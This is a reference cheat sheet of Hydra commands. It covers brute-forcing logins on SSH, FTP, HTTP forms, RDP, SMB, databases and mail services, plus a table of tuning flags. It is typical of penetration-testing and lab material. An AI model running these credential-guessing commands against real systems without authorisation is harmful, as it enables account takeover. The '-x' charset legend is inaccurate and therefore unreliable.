# Hydra - Commands

## Basic Hydra Syntax

| Command | Description |
|---------|-------------|
| `hydra -l admin -P passwords.txt ssh://192.168.1.100` | SSH brute-force with single user |
| `hydra -L users.txt -P passwords.txt ftp://192.168.1.100` | FTP brute-force with user and password lists |
| `hydra -l admin -p password123 10.10.10.10 http-get /login` | HTTP GET form brute-force |
| `hydra -l admin -P passwords.txt -t 4 ssh://192.168.1.100` | SSH brute-force with 4 parallel tasks |
| `hydra -v -l admin -P passwords.txt ssh://192.168.1.100` | Verbose output showing attempt results |

## HTTP POST Form Module

| Command | Description |
|---------|-------------|
| `hydra -l admin -P passwords.txt 10.10.10.10 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"` | POST form brute-force with failure detection |
| `hydra -l admin -P passwords.txt 10.10.10.10 http-post-form "/login:user=^USER^&pass=^PASS^&submit=Login:F=Invalid:H=Cookie: PHPSESSID=abc123"` | POST form with cookie handling |
| `hydra -L users.txt -P passwords.txt 10.10.10.10 http-post-form "/login:username=^USER^&password=^PASS^&csrf=abc123:Invalid username or password"` | POST form with CSRF token handling |

## Service-Specific Modules

| Command | Description |
|---------|-------------|
| `hydra -l root -P passwords.txt ssh://192.168.1.100 -s 2222` | SSH on non-standard port 2222 |
| `hydra -L users.txt -P passwords.txt ftp://192.168.1.100` | FTP brute-force |
| `hydra -l admin -P passwords.txt mysql://192.168.1.100` | MySQL database brute-force |
| `hydra -l admin -P passwords.txt smb://192.168.1.100` | SMB share brute-force |
| `hydra -l admin -P passwords.txt rdp://192.168.1.100` | RDP brute-force |
| `hydra -l admin -P passwords.txt smtp://192.168.1.100` | SMTP authentication brute-force |
| `hydra -l admin@example.com -P passwords.txt pop3://192.168.1.100` | POP3 email brute-force |
| `hydra -l admin -P passwords.txt ldap://192.168.1.100` | LDAP authentication brute-force |
| `hydra -l admin -P passwords.txt vnc://192.168.1.100` | VNC authentication brute-force |

## Advanced Options

| Flag | Description |
|------|-------------|
| `-t 16` | Number of parallel connections (default 16) |
| `-w 30` | Timeout for each connection attempt (seconds) |
| `-W 10` | Time between connection attempts (seconds) |
| `-f` | Stop after finding first valid password |
| `-F` | Stop after finding valid password per host |
| `-o results.txt` | Save results to a file |
| `-s 2222` | Specify non-default port |
| `-v` | Verbose output |
| `-d` | Debug output (shows all attempts) |
| `-x 3:5:a` | Generate passwords: min:max:charset (a=alpha, n=num, s=special) |
| `-I` | Ignore existing restore file |
| `-e nsr` | Try empty password (n), username as password (s), reversed username (r) |
